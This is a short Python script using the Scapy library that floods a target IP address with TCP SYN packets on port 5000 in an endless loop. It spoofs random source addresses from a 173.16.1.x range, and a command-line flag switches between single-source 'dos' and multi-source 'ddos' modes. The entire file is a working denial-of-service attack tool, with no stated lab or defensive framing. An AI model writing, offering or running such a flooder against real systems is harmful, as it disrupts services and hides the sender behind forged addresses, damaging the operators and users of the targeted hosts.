from scapy.all import *
from scapy.layers.inet import IP, TCP
import random
import argparse

data = "asasfa"


def syn_flood(dst, dos=False, ipnum=5):
    if dos:
        ipnum = 1

    src_ip_list = ['173.16.1.' + str(host) for host in random.sample(range(1, 255), ipnum)]

    while True:
        src = random.sample(src_ip_list, 1)[0]
        print("Source ip address: " + src)
        packet = IP(src=src, dst=dst)/TCP(dport=5000, flags='S')/data
        send(packet)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--dst", type=str, help="The dst ip address")
    parser.add_argument("--dos", type=int, help="1: perform dos attack; 0: perform ddos attack")
    parser.add_argument("--ipnum", type=int, help="The number of source ip addresses used in ddos")
    args = parser.parse_args()

    syn_flood(args.dst, args.dos, args.ipnum)